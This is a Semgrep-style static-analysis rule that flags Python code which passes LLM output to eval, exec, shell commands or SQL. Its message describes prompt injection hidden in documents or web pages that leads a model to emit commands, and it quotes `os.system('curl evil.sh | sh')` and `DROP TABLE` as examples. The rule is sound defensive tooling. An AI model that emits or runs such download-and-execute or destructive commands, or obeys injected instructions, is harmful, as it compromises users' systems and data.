rules:
  - id: py-llm-output-to-dangerous-sink
    languages: [python]
    severity: ERROR
    message: >-
      Text generated by an LLM is executed as code, a shell command, or SQL. Model output is
      attacker-influenced: a prompt injection hidden in a document, web page, or user message can
      make the model emit `os.system('curl evil.sh | sh')` or `DROP TABLE`. Treat model output as
      untrusted input: parse it into a constrained structure (JSON schema, enum of allowed actions),
      run code only in an isolated sandbox, and use parameterized SQL.
    metadata:
      title: LLM output reaches code execution, shell, or SQL
      cwe:
        - "CWE-94: Improper Control of Generation of Code ('Code Injection')"
        - "CWE-78: Improper Neutralization of Special Elements used in an OS Command"
      owasp:
        - "A03:2021 - Injection"
        - "LLM05:2025 - Improper Output Handling"
      confidence: medium
    mode: taint
    pattern-sources:
      - pattern: $CLIENT.messages.create(...)
      - pattern: $CLIENT.chat.completions.create(...)
      - pattern: $CLIENT.responses.create(...)
      - pattern: $MODEL.generate_content(...)
      - pattern: $CHAIN.invoke(...)
      - pattern: $CHAIN.ainvoke(...)
    pattern-sanitizers:
      - pattern: json.loads(...)
      - pattern: int(...)
    pattern-sinks:
      - patterns:
          - pattern-either:
              - pattern: eval($X, ...)
              - pattern: exec($X, ...)
              - pattern: os.system($X)
              - pattern: os.popen($X, ...)
              - pattern: subprocess.$FN($X, ..., shell=True, ...)
              - pattern: $CUR.execute($X, ...)
          - focus-metavariable: $X
